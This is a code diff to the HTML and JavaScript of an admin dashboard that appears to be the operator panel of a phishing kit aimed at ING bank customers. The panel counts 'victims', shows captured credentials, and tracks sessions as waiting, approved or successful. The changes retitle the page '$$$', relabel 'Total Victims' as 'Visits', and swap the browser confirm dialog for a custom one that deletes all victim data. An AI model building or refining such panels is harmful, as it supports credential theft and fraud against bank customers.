@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>ING Panel</title>
+  <title>$$$</title>
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -59,10 +59,12 @@
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
     .cred{font-family:monospace;font-size:.8rem;background:var(--cred-bg);padding:2px 4px;border-radius:3px;color:var(--cred-color)}
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
-    #modal, #settingsModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}
+    #modal, #settingsModal, #confirmModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}
     #settingsModal{background:rgba(0,0,0,.9)}
-    #modal .card, #settingsModal .card{max-width:600px;width:90%;background:var(--card-bg);border-color:var(--card-border);max-height:90vh;overflow-y:auto;padding:28px}
-    #settingsModal .card{max-width:500px}
+    #confirmModal{z-index:1001}
+    #modal .card, #settingsModal .card, #confirmModal .card{max-width:600px;width:90%;background:var(--card-bg);border-color:var(--card-border);max-height:90vh;overflow-y:auto;padding:28px}
+    #settingsModal .card{max-width:400px}
+    #confirmModal .card{max-width:380px;text-align:center}
     #empty{text-align:center;color:var(--text-muted);padding:2rem 0}
 
     .modal-header{border-bottom:1px solid var(--card-border);padding-bottom:16px;margin-bottom:20px}
@@ -113,22 +115,24 @@
     tr.approved{opacity:.6;background:rgba(52,211,153,.05)}
     tr.approved td{color:var(--text-muted)}
 
-    /* Settings specific styles */
-    .settings-section{margin-bottom:24px}
-    .settings-title{font-size:14px;font-weight:600;margin-bottom:12px;color:var(--text-primary);text-transform:uppercase;letter-spacing:0.05em}
-    .settings-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--card-border)}
+    /* Settings styles */
+    .settings-row{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--card-border)}
     .settings-row:last-child{border-bottom:none}
-    .settings-label{font-size:13px;color:var(--text-primary)}
-    .settings-desc{font-size:11px;color:var(--text-muted);margin-top:2px}
-    .theme-toggle{display:flex;gap:8px;background:rgba(128,128,128,0.1);padding:4px;border-radius:8px;border:1px solid var(--card-border)}
+    .settings-label{font-size:14px;font-weight:500;color:var(--text-primary)}
+    .settings-value{font-size:14px;color:var(--text-muted);font-family:monospace}
+    .theme-toggle{display:flex;gap:4px;background:rgba(128,128,128,0.1);padding:4px;border-radius:8px;border:1px solid var(--card-border)}
     .theme-option{flex:1;padding:8px 16px;border-radius:6px;border:none;background:transparent;color:var(--text-muted);cursor:pointer;font-size:12px;font-weight:500;transition:all .2s}
     .theme-option.active{background:var(--card-bg);color:var(--text-primary);box-shadow:0 2px 8px rgba(0,0,0,.2)}
-    .refresh-btn{width:100%;padding:12px;border-radius:8px;border:1px solid var(--red);background:rgba(251,113,133,.1);color:var(--red);cursor:pointer;font-size:13px;font-weight:600;transition:all .2s}
-    .refresh-btn:hover{background:rgba(251,113,133,.2)}
-    .stat-row{display:grid;grid-template-columns:repeat(2, 1fr);gap:12px;margin-bottom:12px}
-    .stat-box{background:rgba(128,128,128,0.05);padding:12px;border-radius:8px;border:1px solid var(--card-border)}
-    .stat-box-label{font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px}
-    .stat-box-value{font-size:18px;font-weight:600;color:var(--text-primary)}
+    .delete-session-btn{width:100%;padding:12px;border-radius:8px;border:1px solid var(--red);background:rgba(251,113,133,.1);color:var(--red);cursor:pointer;font-size:13px;font-weight:600;transition:all .2s;margin-top:8px}
+    .delete-session-btn:hover{background:rgba(251,113,133,.2)}
+    
+    /* Confirm modal styles */
+    .confirm-text{font-size:14px;color:var(--text-muted);margin-bottom:20px;line-height:1.5}
+    .confirm-buttons{display:flex;gap:12px;justify-content:center}
+    .confirm-btn{padding:10px 24px;border-radius:8px;border:1px solid var(--card-border);background:rgba(128,128,128,0.1);color:var(--text-primary);cursor:pointer;font-size:13px;font-weight:500;transition:all .2s}
+    .confirm-btn:hover{background:rgba(128,128,128,0.2)}
+    .confirm-btn.danger{background:rgba(251,113,133,.15);border-color:var(--red);color:var(--red)}
+    .confirm-btn.danger:hover{background:rgba(251,113,133,.25)}
 
     /* Mobile */
     @media (max-width: 768px) {
@@ -142,7 +146,7 @@
       .cred{font-size:0.7rem;padding:1px 3px}
       .icon-btn{width:28px;height:28px;padding:4px}
       .icon-btn img{width:16px;height:16px}
-      #modal .card, #settingsModal .card{width:95%;padding:20px;border-radius:12px}
+      #modal .card, #settingsModal .card, #confirmModal .card{width:95%;padding:20px;border-radius:12px}
       .modal-title{font-size:18px}
       .info-grid{grid-template-columns:1fr;gap:12px}
       .info-section{padding:12px}
@@ -163,7 +167,6 @@
       table{font-size:0.7rem}
       th,td{padding:0.3rem 0.2rem}
       td:nth-child(7),th:nth-child(7),td:nth-child(8),th:nth-child(8){display:none}
-      .stat-row{grid-template-columns:1fr}
     }
   </style>
 </head>
@@ -175,7 +178,9 @@
       Hello, <span id="userName">admin</span>! • <span id="clock">--:-- --</span>
     </div>
     <div class="greet-right">
-      <button id="settingsBtn" class="btn" title="Settings">⚙️</button>
+      <button id="settingsBtn" class="icon-btn" title="Settings" style="width:auto;height:auto;padding:8px 12px;">
+        <img src="/images/settings-svgrepo-com.svg" style="width:16px;height:16px;">
+      </button>
       <button id="logoutBtn" class="btn">Logout</button>
     </div>
   </div>
@@ -223,82 +228,72 @@
         <div style="display:flex;justify-content:space-between;align-items:flex-start">
           <div>
             <h3 class="modal-title">Settings</h3>
-            <div class="modal-subtitle">Panel Configuration</div>
           </div>
           <button onclick="closeSettings()" class="btn" style="font-size:18px;padding:4px 12px;line-height:1">✕</button>
         </div>
       </div>
       
       <div id="settingsBody">
-        <!-- User Info -->
-        <div class="settings-section">
-          <div class="settings-title">Account</div>
-          <div class="settings-row">
-            <div>
-              <div class="settings-label">Current User</div>
-              <div class="settings-desc" id="settingsUser">admin</div>
+        <!-- Current User -->
+        <div class="settings-row">
+          <div class="settings-label">Current User</div>
+          <div class="settings-value" id="settingsUser">admin</div>
+        </div>
+
+        <!-- Session Statistics -->
+        <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px">
+          <div class="settings-label">Session Statistics</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+            <div class="stat-box" style="background:rgba(128,128,128,0.05);padding:12px;border-radius:8px;border:1px solid var(--card-border)">
+              <div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Visits (total)</div>
+              <div style="font-size:20px;font-weight:600;color:var(--text-primary)" id="statTotal">0</div>
+            </div>
+            <div class="stat-box" style="background:rgba(128,128,128,0.05);padding:12px;border-radius:8px;border:1px solid var(--card-border)">
+              <div style="font-size:10px;text-transform:uppercase;color:var(--text-muted);margin-bottom:4px">Successful</div>
+              <div style="font-size:20px;font-weight:600;color:var(--green)" id="statSuccess">0</div>
             </div>
           </div>
         </div>
 
-        <!-- Session Stats -->
-        <div class="settings-section">
-          <div class="settings-title">Session Statistics</div>
-          <div class="stat-row">
-            <div class="stat-box">
-              <div class="stat-box-label">Total Victims</div>
-              <div class="stat-box-value" id="statTotal">0</div>
-            </div>
-            <div class="stat-box">
-              <div class="stat-box-label">Active Now</div>
-              <div class="stat-box-value" id="statActive">0</div>
-            </div>
-          </div>
-          <div class="stat-row">
-            <div class="stat-box">
-              <div class="stat-box-label">Successful</div>
-              <div class="stat-box-value" id="statSuccess">0</div>
-            </div>
-            <div class="stat-box">
-              <div class="stat-box-label">Waiting</div>
-              <div class="stat-box-value" id="statWaiting">0</div>
-            </div>
+        <!-- Theme -->
+        <div class="settings-row">
+          <div class="settings-label">Theme</div>
+          <div class="theme-toggle">
+            <button class="theme-option active" id="themeDark" onclick="setTheme('dark')">Dark</button>
+            <button class="theme-option" id="themeLight" onclick="setTheme('light')">Light</button>
           </div>
         </div>
 
-        <!-- Theme Toggle -->
-        <div class="settings-section">
-          <div class="settings-title">Appearance</div>
-          <div class="settings-row">
-            <div>
-              <div class="settings-label">Theme</div>
-              <div class="settings-desc">Choose your preferred color scheme</div>
-            </div>
-            <div class="theme-toggle">
-              <button class="theme-option active" id="themeDark" onclick="setTheme('dark')">🌙 Dark</button>
-              <button class="theme-option" id="themeLight" onclick="setTheme('light')">☀️ Light</button>
-            </div>
+        <!-- Delete Session -->
+        <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px;padding-bottom:0">
+          <div>
+            <div class="settings-label" style="color:var(--red)">Delete Session</div>
+            <div style="font-size:11px;color:var(--text-muted);margin-top:4px">Clear all active sessions and reset all data</div>
           </div>
+          <button class="delete-session-btn" onclick="showConfirmDelete()">Delete All Sessions</button>
         </div>
+      </div>
+    </div>
+  </div>
 
-        <!-- Session Refresh -->
-        <div class="settings-section">
-          <div class="settings-title">Danger Zone</div>
-          <div class="settings-row" style="flex-direction:column;align-items:stretch;gap:12px">
-            <div>
-              <div class="settings-label">Refresh Session</div>
-              <div class="settings-desc">Clear all active sessions, victim data, and reset counters. This cannot be undone.</div>
-            </div>
-            <button class="refresh-btn" onclick="confirmRefresh()">🗑️ Refresh Session</button>
-          </div>
-        </div>
+  <!-- Confirm Delete Modal -->
+  <div id="confirmModal" onclick="if(event.target===this)closeConfirm()">
+    <div class="card">
+      <div class="modal-title" style="margin-bottom:8px;color:var(--red)">⚠️ Delete All Sessions?</div>
+      <div class="confirm-text">
+        This will permanently delete all active sessions, victim data, and reset all counters.<br><br>
+        This action cannot be undone.
+      </div>
+      <div class="confirm-buttons">
+        <button class="confirm-btn" onclick="closeConfirm()">Cancel</button>
+        <button class="confirm-btn danger" onclick="executeDelete()">Delete</button>
       </div>
     </div>
   </div>
 
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
-    let isFirstLoad = true; // Track first load to suppress initial alerts
+    let isFirstLoad = true;
     const qs = s => document.querySelector(s);
     const fmt = t => new Date(t).toLocaleTimeString();
     const fmtDate = t => new Date(t).toLocaleString();
@@ -325,7 +320,6 @@
 
     /* ----------  ALERTS  ---------- */
     function showAlert(type, title, desc, victimNum){
-      // Skip alerts on first load (login)
       if (isFirstLoad) return;
       
       const container = qs('#alert-container');
@@ -375,7 +369,6 @@
 
     /* ----------  CHANGES  ---------- */
     function checkChanges(newSessions){
-      // On first load, just populate lastSessions without alerts
       if (isFirstLoad) {
         lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
         isFirstLoad = false;
@@ -424,11 +417,8 @@
       qs('#domainLink').textContent = d.domain || 'localhost';
       qs('#domainLink').href        = d.domain || 'http://localhost';
 
-      // Update settings stats
       qs('#statTotal').textContent = d.totalVictims;
-      qs('#statActive').textContent = d.active;
       qs('#statSuccess').textContent = d.success;
-      qs('#statWaiting').textContent = d.waiting;
 
       const activeSessions = d.sessions.filter(s => !isApproved(s));
       qs('#active').textContent = activeSessions.length;
@@ -560,17 +550,20 @@
       qs('#settingsModal').style.display = 'none';
     }
     
-    function confirmRefresh() {
-      if (confirm('⚠️ WARNING: This will delete ALL active sessions, victim data, and reset all counters.\n\nThis action cannot be undone.\n\nAre you sure you want to refresh the session?')) {
-        refreshSession();
-      }
+    function showConfirmDelete() {
+      closeSettings();
+      qs('#confirmModal').style.display = 'flex';
     }
     
-    async function refreshSession() {
+    function closeConfirm() {
+      qs('#confirmModal').style.display = 'none';
+    }
+    
+    async function executeDelete() {
       await fetch('/api/refresh', {method: 'POST'});
       lastSessions.clear();
-      isFirstLoad = true; // Reset to suppress alerts on refresh
-      closeSettings();
+      isFirstLoad = true;
+      closeConfirm();
       load();
     }
 
@@ -590,7 +583,7 @@
     /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
-      isFirstLoad = true; // Reset for next login
+      isFirstLoad = true;
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
     };
@@ -607,7 +600,6 @@
       setTimeout(load,300);
     }
     
-    // Initialize
     loadTheme();
     load();
   </script>
